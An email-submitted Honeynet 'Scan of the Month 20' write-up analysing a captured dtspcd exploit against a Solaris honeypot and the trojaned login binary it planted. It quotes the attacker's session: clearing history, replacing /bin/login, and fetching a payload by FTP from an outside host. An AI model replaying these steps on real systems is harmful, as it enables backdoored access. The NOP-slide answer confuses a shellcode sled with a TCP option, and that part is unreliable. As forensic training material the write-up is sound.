@@ -1,0 +1,340 @@
+From inouk@toutatis.igt.net Fri Apr 26 15:27:36 2002
+Date: Fri, 19 Apr 2002 15:14:49 -0400 (EDT)
+From: Eric LeBlanc <inouk@toutatis.igt.net>
+To: project@honeynet.org
+Subject: scan20.txt
+
+Hello,
+
+Here is the paper about scan of the month, number 20 :-)
+
+Regards,
+
+Eric LeBlanc
+inouk@igt.net
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+project.honeynet.org Scan of the Month Challenge - Scan 20
+
+Submitted by: Eric LeBlanc <inouk@igt.net>
+
+
+--------------------------------------------------------------------------
+The Challenge:
+--------------------------------------------------------------------------
+
+On 08 January, 2002 a default, unpatched installation of Solaris8 Sparc
+was remotely compromised with the dtspcd exploit. What makes this attack
+interesting is that this is the first time the attack was identified and
+captured in the wild, resulting a CERT advisory. Using the Snort binary
+capture of the attack, answer the following questions. The honeypot that
+is attacked is 172.16.1.102. 
+
+--------------------------------------------------------------------------
+Files:
+--------------------------------------------------------------------------
+
+scan19.tar.gz, MD5 =11e0be295d138df14111796a7733a5d2
+
+--------------------------------------------------------------------------
+Verify data integrity:
+--------------------------------------------------------------------------
+
+$ md5sum scan19.tar.gz
+11e0be295d138df14111796a7733a5d2  scan19.tar.gz
+
+--------------------------------------------------------------------------
+Tools: 
+--------------------------------------------------------------------------
+
+Snort    - Popular IDS, http://www.snort.org
+Ethereal - Used to analysis tcpdump format packets, http://www.ethereal.org
+tcpdump  - Popular network monitoring, http://www.tcpdump.org
+strings  - Show word human readable from binary files
+truss    - trace system calls from executable files in Solaris systems.
+
+Debian GNU/Linux 3.0 - my workstation to analysis snort file and sun1 binary 
+                       (with file and strings).
+Solaris 2.5.1        - a machine test for analyzing sun1 binary (with truss).
+
+
+--------------------------------------------------------------------------
+1.- What is a NOP slide, and how is this one different from the NOP
+slide in the rpc.statd exploit in Scan10?
+--------------------------------------------------------------------------
+
+For better explanation about NOP slide, I will put an extract from RFC793:
+
+[...]
+      No-Operation
+
+        +--------+
+        |00000001|
+        +--------+
+         Kind=1
+
+        This option code may be used between options, for example, to
+        align the beginning of a subsequent option on a word boundary.
+        There is no guarantee that senders will use this option, so
+        receivers must be prepared to process options even if they do
+        not begin on a word boundary.
+[...]
+
+The difference between this exploit and this one from scan10 is the
+protocol.  Indeed, the exploit from scan10 use UDP, and here, it use TCP.
+Anyway, UDP does not have options.
+
+
+--------------------------------------------------------------------------
+2.- The attack was on 08 Jan, 2002. Would Snort have generated an alert
+then for the attack?
+--------------------------------------------------------------------------
+
+No, the first advisory (about remote exploit with more details) was
+published at January 14, 2002 as show at http://www.cert.org/advisories/CA-2002-01.html.
+
+
+--------------------------------------------------------------------------
+3.- In the exploit code, the command "/bin/sh sh -i" is given, what is
+its purpose, and why is 'sh' shown twice?
+--------------------------------------------------------------------------
+
+when you use exec(), it need the path of program (or filename) and name
+of this one (which is a first argument, same as argv[0]).  It is a 
+carasteristic from family of exec().  In other words, if you want 
+execute "ls -l":
+
+execl("/bin/ls", "ls", "-l"); 
+
+The first argument is the full pathname of program, second is a name of
+program (argv[0]) and finally, the option (argv[1]).  It's a convention.
+
+if you put only "/bin/sh -i" in inetd, you will be able to connect to
+the system, but it is useless because it does not reconize any commands.
+Also, in "ps aux" (or "ps -ef" in others systems), you will see only "-i"
+in process list.  
+
+For example:
+
+root     24736  0.3  0.8  2152 1040 ?        S    09:13   0:00 -i
+
+
+--------------------------------------------------------------------------
+4.- The attacker executed a variety of commands on the hacked Solaris
+box. Which commands were automated by the exploit, which commands were
+manual by the attacker himself?
+--------------------------------------------------------------------------
+
+You can have output of commands from snort, or better ethereal. To do this, 
+Right click on the first packet which it contains commands, and click
+"follow tcp streams", and then "save as".  Or else by a command "strings
+0108@000-snort.log".
+
+
+Here the command which is automated by the exploit:
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+uname -a;ls -l /core
+/var/dt/tmp/DTSPCD.log;PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:/usr/ccs/bin:/usr/gnu/bin;export
+PATH;echo "BD PID(s): "`ps -fed|grep ' -s /tmp/x'|grep -v grep|awk '{print $2}'`
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+and the output from this one:
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+# SunOS buzzy 5.8 Generic_108528-03 sun4u sparc SUNW,Ultra-5_10
+/core: No such file or directory
+/var/dt/tmp/DTSPCD.log: No such file or directory
+BD PID(s): 3476
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+First, I dont think that the hacker type all command in one, separated
+by semi-colons.  Second, if you read the last command, the BD PID, why he
+would does that?  In conclusion, I think it's is automated by the exploit.
+But... another possibility, the hacker can have copy and paste this line.
+
+
+And commands made by the hacker (I replaced some lines in good order):
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+# w
+  8:47am  up 11:24,  0 users,  load average: 0.12, 0.04, 0.02
+User     tty           login@  idle   JCPU   PCPU  what
+# unset HISTFILE
+# cd /tmp
+# mkdir /usr/lib
+mkdir: Failed to make directory "/usr/lib"; File exists
+# mv /bin/login /usr/lib/libfl.k
+# ftp 64.224.118.115
+ftp: ioctl(TIOCGETP): Invalid argument
+Name (64.224.118.115:root): ftp
+Password:a@
+cd pub
+binary
+get sun1
+bye
+# ls
+ps_data
+sun1
+# chmod 555 sun1
+# mv sun1 /bin/login
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+
+--------------------------------------------------------------------------
+5.- What is sun1, and how does it work? 
+--------------------------------------------------------------------------
+
+I used ethereal to got this binary, with the same method showed above.
+
+It's a login trojaned.  If you see these commands showed above:
+
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+# mv /bin/login /usr/lib/libfl.k
+[...]
+# chmod 555 sun1
+# mv sun1 /bin/login
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+
+and the hacker ensures itself to see if it's functionnal by telnet:
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+[...]
+10:47:50.350643 66.156.236.56.4065 > 172.16.1.102.23: S 1391784051:1391784051(0) 
+win 65535 <mss 1360,nop,wscale 0,nop,nop,timestamp 0 0,nop,nop,sackOK> (DF)
+10:47:50.352025 172.16.1.102.23 > 66.156.236.56.4065: S 1631285916:1631285916(0) 
+ack 1391784052 win 25612 <nop,nop,timestamp 4169416 0,nop,wscale 0,nop,nop,sackOK,mss 1460> (DF)
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+[ all others packets are removed such as the display of Solaris 2.8 ]
+
+
+To analysis the binary, I used "file" and "strings":
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+$ file sun1
+sun1: ELF 32-bit MSB executable, SPARC, version 1 (SYSV), statically linked, stripped
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+OK, it's a executable file.  So, I decided to use strings to analyzing the content 
+of this one.
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+$ strings sun1 |more
+" H@
+$#<@
+/ @@
+# @@
+DISPLAY
+/usr/lib/libfl.k
+pirc
+/bin/sh
+lError 0
+Not owner
+[ other chunk not essential ]
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+As you can see, /usr/lib/libfl.k is a login program, but two others entries 
+are also interessing such as "pirc" and "/bin/sh".
+
+I used truss to see syscalls from login trojaned (I will display essential only):
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+# truss -t \!mmap,\!munmap,\!llseek,\!ioctl,\!fstat,\!fstat64 ./sun1
+execve("./sun1", 0xFFBEFE2C, 0xFFBEFE34)  argc = 1
+execve("/usr/lib/libfl.k", 0xFFBEFE2C, 0xFFBEFE34)  argc = 1
+stat("/usr/lib/libfl.k", 0xFFBEFAE8)            = 0
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+Here is the real login, in /usr/lib/libfl.k.  If it does not exist,
+this trojan will be killed.
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+[...]
+write(1, " l o g i n :  ", 7)                    = 7
+login: 
+read(0, 0xFF1BF634, 1024)       (sleeping...)
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+Here, it wait for login and I type "pirc"
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+read(0, " p i r c\n", 1024)                     = 5
+open64("/etc/.name_service_door", O_RDONLY)     = 3
+open("/dev/tty", O_RDONLY)                      = 4
+write(2, " P a s s w o r d :  ", 10)          = 10
+Password:
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+asking for password... I don't know, I tryed with "pirc"
+
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+read(4, 0xFF1BBC14, 1)          (sleeping...)
+read(4, " p", 1)                                = 1
+read(4, " i", 1)                                = 1
+read(4, " r", 1)                                = 1
+read(4, " c", 1)                                = 1
+read(4, "\n", 1)                                = 1
+write(2, "\n", 1)                               = 1
+
+open("/dev/conslog", O_WRONLY)                  = 4
+open("/usr/share/lib/zoneinfo/Canada/Eastern", O_RDONLY) = 5
+open("/var/run/syslog_door", O_RDONLY)          = 5
+open("/var/run/syslog_door", O_RDONLY)          = 5
+write(1, " L o g i n   i n c o r r".., 16)      = 16
+Login incorrect
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+OK, there is more interessing.
+
+I tried with a real login which exist in /etc/passwd from a test machine:
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+login: write(1, " l o g i n :  ", 7)                    = 7
+read(0, 0xFF1BF634, 1024)      (sleeping...)
+eleblanc
+read(0, " e l e b l a n c\n", 1024)             = 9
+open("/etc/shadow", O_RDONLY)                   = 5
+read(5, " r o o t : X X X X X X X".., 8192)     = 281
+open("/dev/tty", O_RDONLY)                      = 5
+write(2, " P a s s w o r d :  ", 10)          = 10
+Password: 
+read(5, 0xFF1BBC1C, 1)          (sleeping...)
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+You See the difference ? With a real login, it read in /etc/shadow, 
+but if I use "pirc" as login, it does'nt read this file.
+
+My conclusion is that the sun1 is a login trojaned permit to intruder to login
+to the system without traces (no entries in /var/adm/utmpx, possibly not
+entries in 'w', etc) and, possibility start a own /bin/sh shell.
+
+
+--------------------------------------------------------------------------
+6.- What did you learn from this exercise? 
+--------------------------------------------------------------------------
+
+I learned that some rootkit or programs can be very difficult to find.
+For example, I can't find sun1 password (for login pirc), and more
+important, the rootkit related for it (if it exist).  Indeed, it be a
+program made by a "hacker" and he is the only person to own it.
+
+My writing english of course... I'm a french, or more precisely, a
+"Quebecer" :-)
+
+--------------------------------------------------------------------------
+7.- How long did this challenge take you? 
+--------------------------------------------------------------------------
+
+Analysis snort file: 25 minutes (analysis, extract some files (sun1,
+commands)) 
+
+Analysis trojan "sun1": 2 hours (more times in research with
+google.com than analysis with truss/strings) 
+
+Documentation: 3 hours
+
+Total: 5h25
+
+
+EOF
+
